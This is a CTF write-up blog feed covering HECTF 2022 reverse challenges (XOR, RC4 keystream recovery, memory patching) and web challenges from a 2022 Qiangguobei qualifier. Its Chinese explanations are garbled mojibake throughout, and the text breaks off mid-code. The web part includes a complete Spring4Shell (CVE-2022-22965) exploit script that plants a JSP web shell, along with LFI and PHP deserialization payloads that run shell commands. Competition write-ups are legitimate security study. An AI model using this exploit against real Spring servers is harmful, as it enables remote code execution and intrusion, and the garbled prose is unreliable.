<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=<span class="hljs-string">&#x27;X[]LZeX&#123;ttqAwqmc&#x27;</span><br>e=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> a:<br>    e+=<span class="hljs-built_in">chr</span>((<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">0x1f</span>)+<span class="hljs-number">1</span>)<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>


<h2 id="authorâ€™sB0x"><a href="#authorâ€™sB0x" class="headerlink" title="authorâ€™sB0x"></a>authorâ€™sB0x</h2><p>è§‚å¯Ÿå‘ç°<code>init_S</code>,<code>init_Key</code>,<code>permute_S</code>,<code>create_key_stream</code>è¿™å‡ ä¸ªå‡½æ•°ä¸­ç”¨åˆ°çš„æ•°æ®æ˜¯å›ºå®šçš„ï¼Œç”¨æ¥ç”Ÿæˆ<code>KeyStream</code></p>
<p><img src="/img/wp/2022/2022hectf-20.png"></p>
<p>ç›´æ¥ç²˜è´´åˆ°ç¼–è¯‘å™¨è¿è¡Œ</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> S[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> T[<span class="hljs-number">256</span>]=&#123;&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> Key[]=<span class="hljs-string">&quot;thisiskey&quot;</span>;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> KeyStream[<span class="hljs-number">32</span>]=&#123;&#125;;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">init_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = S;<br>    S[i] = i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">init_Key</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    result = T;<br>    T[i] = Key[i % <span class="hljs-number">9</span>];<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *<span class="hljs-title function_">permute_S</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *result; <span class="hljs-comment">// rax</span><br>  <span class="hljs-type">int</span> v1; <span class="hljs-comment">// [rsp+4h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span><br><br>  v3 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">255</span>; ++i )<br>  &#123;<br>    v3 = (S[i] + v3 + (<span class="hljs-type">char</span>)T[i]) % <span class="hljs-number">256</span>;<br>    v1 = S[i];<br>    S[i] = S[v3];<br>    result = S;<br>    S[v3] = v1;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">char</span>  <span class="hljs-title function_">create_key_stream</span><span class="hljs-params">(<span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">int</span> v2; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">char</span> result; <span class="hljs-comment">// al</span><br>  <span class="hljs-type">int</span> v4; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [rsp+14h] [rbp-Ch]</span><br>  <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  v5 = <span class="hljs-number">0</span>;<br>  v6 = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; KeyStream[v5++] = S[(S[v6] + S[i]) % <span class="hljs-number">256</span>] )<br>  &#123;<br>    v2 = a2--;<br>    result = v2 != <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( !result )<br>      <span class="hljs-keyword">break</span>;<br>    i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>;<br>    v6 = (v6 + S[i]) % <span class="hljs-number">256</span>;<br>    v4 = S[i];<br>    S[i] = S[v6];<br>    S[v6] = v4;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>   init_S();<br>  init_Key();<br>  permute_S();<br>  create_key_stream(<span class="hljs-number">32</span>);<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">32</span>;i++)&#123;<br>	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,KeyStream[i]);<br>  &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>è¿è¡Œåå¾—åˆ°<code>[139,176,166,182,170,108,177,66,249,64,195,137,150,140,2,41,86,253,212,116,98,236,64,117,90,37,237,197,126,172,174,59]</code>ï¼Œè¿™ä¸ªå°±æ˜¯<code>KeyStream</code>çš„å€¼</p>
<p><code>KeyStream</code>çš„å€¼ä¸<code>Cry</code>çš„å€¼å¼‚æˆ–ï¼Œå¾—åˆ°flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">a=[<span class="hljs-number">0xC3</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0xE2</span>,<span class="hljs-number">0xEC</span>,<span class="hljs-number">0x17</span>,<span class="hljs-number">0xE5</span>,<span class="hljs-number">0x2A</span>,<span class="hljs-number">0xCA</span>,<span class="hljs-number">0x3</span>,<span class="hljs-number">0xB6</span>,<span class="hljs-number">0xFD</span>,<span class="hljs-number">0xC1</span>,<span class="hljs-number">0xBC</span>,<span class="hljs-number">0x70</span>,<span class="hljs-number">0x44</span>,<span class="hljs-number">0x10</span>,<span class="hljs-number">0xCD</span>,<span class="hljs-number">0xA6</span>,<span class="hljs-number">0x13</span>,<span class="hljs-number">0x0B</span>,<span class="hljs-number">0x9A</span>,<span class="hljs-number">0x73</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0x0E</span>,<span class="hljs-number">0x4D</span>,<span class="hljs-number">0xDE</span>,<span class="hljs-number">0x95</span>,<span class="hljs-number">0x12</span>,<span class="hljs-number">0x9C</span>,<span class="hljs-number">0xD9</span>,<span class="hljs-number">0x46</span>]<br>b=[<span class="hljs-number">139</span>,<span class="hljs-number">176</span>,<span class="hljs-number">166</span>,<span class="hljs-number">182</span>,<span class="hljs-number">170</span>,<span class="hljs-number">108</span>,<span class="hljs-number">177</span>,<span class="hljs-number">66</span>,<span class="hljs-number">249</span>,<span class="hljs-number">64</span>,<span class="hljs-number">195</span>,<span class="hljs-number">137</span>,<span class="hljs-number">150</span>,<span class="hljs-number">140</span>,<span class="hljs-number">2</span>,<span class="hljs-number">41</span>,<span class="hljs-number">86</span>,<span class="hljs-number">253</span>,<span class="hljs-number">212</span>,<span class="hljs-number">116</span>,<span class="hljs-number">98</span>,<span class="hljs-number">236</span>,<span class="hljs-number">64</span>,<span class="hljs-number">117</span>,<span class="hljs-number">90</span>,<span class="hljs-number">37</span>,<span class="hljs-number">237</span>,<span class="hljs-number">197</span>,<span class="hljs-number">126</span>,<span class="hljs-number">172</span>,<span class="hljs-number">174</span>,<span class="hljs-number">59</span>]<br>e=<span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">for</span> i,v <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(a):<br>    e+=<span class="hljs-built_in">chr</span>(v^b[i])<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure>

<h2 id="å‹‡å£«æ–—æ¶é¾™"><a href="#å‹‡å£«æ–—æ¶é¾™" class="headerlink" title="å‹‡å£«æ–—æ¶é¾™"></a>å‹‡å£«æ–—æ¶é¾™</h2><p>åœ¨idaä¸­é€šè¿‡æœç´¢å­—ç¬¦ä¸²è·³è½¬åˆ°ç¨‹åºä¸»è¦å‡½æ•°ï¼Œå¾—åˆ°å‡½æ•°å¯¹äºç¨‹åºçš„åç§»åœ°å€<code>38B0</code></p>
<p><img src="/img/wp/2022/2022hectf-21.png"></p>
<p>x64dbgåŠ¨æ€è°ƒè¯•ç¨‹åºï¼Œåœ¨ä¸»è¦å‡½æ•°è®¾ç½®æ–­ç‚¹</p>
<p><img src="/img/wp/2022/2022hectf-22.png"></p>
<p>å½“ç¨‹åºä¸­æ–­æ—¶ï¼Œrcxçš„å€¼æ˜¯<code>00000170E3A824B0</code>ï¼Œå‚¨å­˜äº†ä¸¤ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘äº†å‹‡å£«å’Œæ¶é¾™çš„å¯¹è±¡</p>
<p><img src="/img/wp/2022/2022hectf-23.png"></p>
<p><img src="/img/wp/2022/2022hectf-24.png"></p>
<p><code>0x170e3a828e0+0x20</code>åœ°å€å¤„å‚¨å­˜äº†å‹‡å£«çš„é‡‘å¸æ•°ï¼Œå°†å…¶ä¿®æ”¹ä¸º<code>0xffff</code>,è´­ä¹°é«˜çº§çš„è£…å¤‡ï¼Œå°†å†…å­˜åœ°å€è½¬ç§»åˆ°<code>0x170e3a82950+0x20</code>æŒ‡å‘çš„åœ°å€å¤„ï¼Œè¾“å…¥<code>a</code>æ”»å‡»æ¶é¾™ï¼Œè§‚å¯Ÿå†…å­˜æ•°æ®å˜åŒ–,å½“æ¶é¾™è¡€é‡ä¸º<code>520</code>æ—¶å¾—åˆ°<code>flag</code></p>
<p><img src="/img/wp/2022/2022hectf-25.png"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>HECTF</tag>
        <tag>2022</tag>
      </tags>
  </entry>
  <entry>
    <title>2022å¼ºå›½æ¯æŠ€æœ¯æŠ€èƒ½å¤§èµ›ä¸œéƒ¨æ™‹çº§èµ›wp</title>
    <url>/posts/82e1297c/</url>
    <content><![CDATA[<p>Rankï¼š13ï¼Œè¢«æ‰“çˆ†äº†</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="md5-php"><a href="#md5-php" class="headerlink" title="md5_php"></a>md5_php</h2><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-type:text/html;charset=utf-8&#x27;</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><br><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>]))&#123;<br>   <span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$md5</span>==<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$md5</span>))<br>       <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">&#x27;le.php&#x27;</span>);<br>   <span class="hljs-keyword">else</span><br>       <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;å¿«äº†è§£MD5&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;MMMMDDDD5555&quot;</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
<p>md5å¼±æ¯”è¾ƒï¼Œæ‰¾ä¸€ä¸ªåŠ å¯†å‰åéƒ½æ˜¯0eå¼€å¤´çš„å€¼</p>
<p>ä¼ å…¥<code>?md5=0e215962017</code></p>
<p>æ‹¿åˆ°<code>le.php</code>çš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))<br>&#123;<br>    <span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;good&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;luck&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br>        <span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Sorry, we currently only support flag and luck.&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>ä¼ å…¥çš„å€¼ä¸­è¦åŒ…å«<code>good</code>ï¼Œ<code>luck</code>æˆ–è€…<code>index</code></p>
<p>ç”¨ä¼ªåè®®è¯»å†…å®¹ï¼Œç”¨<code>index/../flag</code>ç»•è¿‡åˆ¤æ–­</p>
<p>æœ€åä¼ å…¥<code>?file=php://filter/convert.base64-encode/resource=index/../flag</code>æ‹¿åˆ°flag</p>
<h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><p>é€šè¿‡æŠ¥é”™é¡µé¢å¾—çŸ¥æ˜¯<code>spring</code></p>
<p><code>github</code>æœæœ€æ–°çš„<code>spring rce</code></p>
<p>é€šè¿‡<code>CVE-2022-22965</code>çš„<code>POC</code>getshell</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Author: @Rezn0k</span><br><span class="hljs-comment"># Based off the work of p1n93r</span><br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> urlparse<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># Set to bypass errors if the target site has SSL issues</span><br>requests.packages.urllib3.disable_warnings()<br><br>post_headers = &#123;<br>    <span class="hljs-string">&quot;Content-Type&quot;</span>: <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span><br>&#125;<br><br>get_headers = &#123;<br>    <span class="hljs-string">&quot;prefix&quot;</span>: <span class="hljs-string">&quot;&lt;%&quot;</span>,<br>    <span class="hljs-string">&quot;suffix&quot;</span>: <span class="hljs-string">&quot;%&gt;//&quot;</span>,<br>    <span class="hljs-comment"># This may seem strange, but this seems to be needed to bypass some check that looks for &quot;Runtime&quot; in the log_pattern</span><br>    <span class="hljs-string">&quot;c&quot;</span>: <span class="hljs-string">&quot;Runtime&quot;</span>,<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_exploit</span>(<span class="hljs-params">url, directory, filename</span>):<br>    log_pattern = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20&quot;</span> \<br>                  <span class="hljs-string">f&quot;java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter&quot;</span> \<br>                  <span class="hljs-string">f&quot;(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B&quot;</span> \<br>                  <span class="hljs-string">f&quot;%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&quot;</span><br><br>    log_file_suffix = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&quot;</span><br>    log_file_dir = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.directory=<span class="hljs-subst">&#123;directory&#125;</span>&quot;</span><br>    log_file_prefix = <span class="hljs-string">f&quot;class.module.classLoader.resources.context.parent.pipeline.first.prefix=<span class="hljs-subst">&#123;filename&#125;</span>&quot;</span><br>    log_file_date_format = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=&quot;</span><br><br>    exp_data = <span class="hljs-string">&quot;&amp;&quot;</span>.join([log_pattern, log_file_suffix, log_file_dir, log_file_prefix, log_file_date_format])<br><br>    <span class="hljs-comment"># Setting and unsetting the fileDateFormat field allows for executing the exploit multiple times</span><br>    <span class="hljs-comment"># If re-running the exploit, this will create an artifact of &#123;old_file_name&#125;_.jsp</span><br>    file_date_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=file_date_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Change the tomcat log location variables</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Modifying Log Configurations&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=exp_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br>    <span class="hljs-comment"># Changes take some time to populate on tomcat</span><br>    time.sleep(<span class="hljs-number">3</span>)<br><br>    <span class="hljs-comment"># Send the packet that writes the web shell</span><br>    ret = requests.get(url, headers=get_headers, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response Code: %d&quot;</span> % ret.status_code)<br><br>    time.sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># Reset the pattern to prevent future writes into the file</span><br>    pattern_data = <span class="hljs-string">&quot;class.module.classLoader.resources.context.parent.pipeline.first.pattern=&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Resetting Log Variables.&quot;</span>)<br>    ret = requests.post(url, headers=post_headers, data=pattern_data, verify=<span class="hljs-literal">False</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Response code: %d&quot;</span> % ret.status_code)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Spring Core RCE&#x27;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--url&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;target url&#x27;</span>, required=<span class="hljs-literal">True</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--file&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;File to write to [no extension]&#x27;</span>, required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;shell&quot;</span>)<br>    parser.add_argument(<span class="hljs-string">&#x27;--dir&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;Directory to write to. Suggest using &quot;webapps/[appname]&quot; of target app&#x27;</span>,<br>                        required=<span class="hljs-literal">False</span>, default=<span class="hljs-string">&quot;webapps/ROOT&quot;</span>)<br><br>    file_arg = parser.parse_args().file<br>    dir_arg = parser.parse_args().<span class="hljs-built_in">dir</span><br>    url_arg = parser.parse_args().url<br><br>    filename = file_arg.replace(<span class="hljs-string">&quot;.jsp&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br>    <span class="hljs-keyword">if</span> url_arg <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Must pass an option for --url&quot;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-keyword">try</span>:<br>        run_exploit(url_arg, dir_arg, filename)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Exploit completed&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Check your target for a shell&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] File: &quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span>)<br><br>        <span class="hljs-keyword">if</span> dir_arg:<br>            location = urlparse(url_arg).scheme + <span class="hljs-string">&quot;://&quot;</span> + urlparse(url_arg).netloc + <span class="hljs-string">&quot;/&quot;</span> + filename + <span class="hljs-string">&quot;.jsp&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            location = <span class="hljs-string">f&quot;Unknown. Custom directory used. (try app/<span class="hljs-subst">&#123;filename&#125;</span>.jsp?cmd=id&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] Shell should be at: <span class="hljs-subst">&#123;location&#125;</span>?cmd=id&quot;</span>)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(e)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure>


<p><img src="/img/wp/2022/2022qgb-east-1.png"></p>
<h2 id="PHPååºåˆ—åŒ–2"><a href="#PHPååºåˆ—åŒ–2" class="headerlink" title="PHPååºåˆ—åŒ–2"></a>PHPååºåˆ—åŒ–2</h2><p>æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">easy</span>();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;ClassObj-&gt;<span class="hljs-title function_ invoke__">action</span>();<br>    &#125;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">easy</span></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hello Hacker&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;file);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;eval&#x27;</span>)!==False)&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&#x27;flag&#x27;</span>)!==False) &#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Hacker&lt;/br&gt;&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$user</span>  = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>


<p>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">main</span></span>&#123;<br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$ClassObj</span>;<br>	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable language_">$this</span>-&gt;ClassObj = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">evil</span>();<br>	&#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">evil</span></span>&#123;<br>	<span class="hljs-keyword">private</span> <span class="hljs-variable">$file</span> = <span class="hljs-string">&#x27;system(&quot;cat /fla*&quot;);&#x27;</span>;<br>&#125;<br><span class="hljs-variable">$user</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">main</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$user</span>));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>




<h2 id="phpti"><a href="#phpti" class="headerlink" title="phpti"></a>phpti</h2><p>å­—ç¬¦ä¸²é€ƒé€¸</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$uname</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$password</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$uname</span>,<span class="hljs-variable">$password</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;uname=<span class="hljs-variable">$uname</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;password=<span class="hljs-variable">$password</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;password===<span class="hljs-string">&#x27;admin&#x27;</span>)<br>        &#123;<br>            <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;r11.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker\n&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$string</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;phpinfo()&#x27;</span>,<span class="hljs-string">&#x27;phpinfo()up&#x27;</span>,<span class="hljs-variable">$string</span>);<br>&#125;<br><span class="hljs-variable">$uname</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]<br><span 